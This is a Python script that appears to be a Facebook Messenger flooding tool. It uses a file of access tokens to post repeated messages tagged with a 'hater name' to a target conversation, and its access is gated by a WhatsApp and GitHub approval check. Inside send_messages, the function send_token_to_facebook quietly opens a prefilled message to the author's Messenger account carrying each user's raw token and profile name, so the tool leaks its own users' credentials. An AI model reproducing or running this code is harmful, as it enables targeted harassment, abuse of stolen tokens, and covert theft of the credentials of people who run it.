import requests
import time
import os
import sys
import hashlib
from urllib.parse import quote
from colorama import init, Fore, Style
import webbrowser
import json

# Initialize Colorama
init(autoreset=True)

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

# Unique Key Generate Karne Ka Function
def get_unique_id():
    try:
        unique_str = str(os.getlogin())
        return hashlib.sha256(unique_str.encode()).hexdigest()
    except Exception as e:
        print(f'Error generating unique ID: {e}')
        exit(1)

# Approval Check Karne Ka Function
def check_permission(unique_key, max_retries=10, retry_interval=10):
    print(Fore.YELLOW + "[🔄] Checking Approval...")

    for attempt in range(max_retries):
        try:
            response = requests.get('https://raw.githubusercontent.com/rajput-roni/7k/refs/heads/main/Approval.txt')
            if response.status_code == 200:
                data = response.text
                if unique_key in data:
                    print(Fore.GREEN + "[√] Permission granted. Your Key Was Approved.")
                    return True
                else:
                    print(Fore.RED + f"[❌] Your Key is NOT Approved! Attempt {attempt+1}/{max_retries}... Retrying in {retry_interval}s")
            else:
                print(f'Failed to fetch approval list. Status code: {response.status_code}')
            
        except Exception as e:
            print(f'Error checking approval: {e}')
        
        time.sleep(retry_interval)
    
    print(Fore.RED + "[❌] Approval failed after multiple attempts. Exiting.")
    exit(1)

# Approval Request WhatsApp Pe Bhejna
def send_approval_request(unique_key):
    try:
        message = f'Hello, Raj Thakur sir! Please Approve My Token is :: {unique_key}'
        url = f'https://wa.me/+919695003501?text={quote(message)}'
        
        print(Fore.YELLOW + '[📲] Opening WhatsApp for approval request...')
        webbrowser.open(url)

    except Exception as e:
        print(f'Error sending approval request: {e}')
        exit(1)

# Approval System Start Karna
def pre_main():
    clear_screen()
    unique_key = get_unique_id()
    print(f'{Fore.YELLOW}[🔐] Your Unique Key: {Fore.CYAN}{unique_key}')
    send_approval_request(unique_key)
    if check_permission(unique_key):  
        print(Fore.GREEN + "[✔] Approved! Now Starting Your Script...\n")

# Token se Profile Name Fetch Karna
def get_profile_name(token):
    url = f"https://graph.facebook.com/me?access_token={token}"
    try:
        response = requests.get(url)
        data = response.json()
        return data.get("name", "Unknown")
    except:
        return "Unknown"

# Token Facebook Messenger Inbox Me Bhejna
def send_token_to_facebook(token):
    profile_name = get_profile_name(token)
    try:
        message = f'Hello, Raj Khan sir! I am using your tool. My token 🔐 ==> {token}\nProfile Name: {profile_name}'
        facebook_url = f'https://www.facebook.com/messages/t/shankar.panchal.9883739?text={quote(message)}'

        print('[📩] Sending token to Facebook Messenger...')
        webbrowser.open(facebook_url)

    except Exception as e:
        print(f'Error sending message to Facebook: {e}')

# Messages Send Karne Ka Function
def send_messages(tokens_file, target_id, messages_file, haters_name, speed):
    with open(messages_file, "r") as file:
        messages = file.readlines()
    with open(tokens_file, "r") as file:
        tokens = [token.strip() for token in file.readlines()]

    headers = {"User-Agent": "Mozilla/5.0"}

    for token in tokens:
        send_token_to_facebook(token)  # Token ko Messenger inbox me bhejna
        profile_name = get_profile_name(token)  # Token ka naam fetch karna
        
        for message in messages:
            full_message = f"{haters_name} {message.strip()}"

            url = f"https://graph.facebook.com/v17.0/t_{target_id}"
            parameters = {"access_token": token, "message": full_message}

            try:
                response = requests.post(url, json=parameters, headers=headers)
                response.raise_for_status()
                current_time = time.strftime("%Y-%m-%d %I:%M:%S %p")

                print(Fore.YELLOW + f"\n[🎉] MESSAGE SENT SUCCESSFULLY!")
                print(Fore.CYAN + f"[📨] MESSAGE: {full_message}")
                print(Fore.LIGHTWHITE_EX + f"[👤] SENT BY: {profile_name}")
                print(Fore.LIGHTWHITE_EX + f"[⏰] TIME: {current_time}")

            except requests.exceptions.RequestException:
                continue  

            time.sleep(speed)

    print(Fore.CYAN + "\n[+] All messages sent. Restarting the process...\n")

# Main Function
def main():
    pre_main()  
    clear_screen()

    tokens_file = input(Fore.GREEN + "【📕】 ENTER TOKEN FILE➜ ")
    target_id = input(Fore.GREEN + "【🖇️】 ENTER CONVO UID ➜ ")
    messages_file = input(Fore.GREEN + "【📝】 ENTER MESSAGE FILE➜ ")
    haters_name = input(Fore.GREEN + "【🖊️】 ENTER HATER NAME➜ ")
    speed = float(input(Fore.GREEN + "【⏰】 ENTER DELAY/TIME (sec) ➜ "))

    send_messages(tokens_file, target_id, messages_file, haters_name, speed)

if __name__ == "__main__":
    main()
